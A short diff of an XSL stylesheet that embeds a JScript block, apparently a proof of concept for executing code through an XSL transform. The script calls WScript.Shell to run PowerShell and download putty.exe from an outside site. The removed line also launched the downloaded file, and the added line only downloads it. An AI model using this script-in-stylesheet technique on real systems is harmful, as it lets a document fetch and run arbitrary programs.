@@ -6,7 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run(" powershell Invoke-WebRequest -uri https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -o putty.exe;start putty.exe")
-");
+	var r = new ActiveXObject("WScript.Shell").Run(" powershell Invoke-WebRequest -uri https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -o putty.exe");
 	]]> </ms:script>
 </stylesheet>
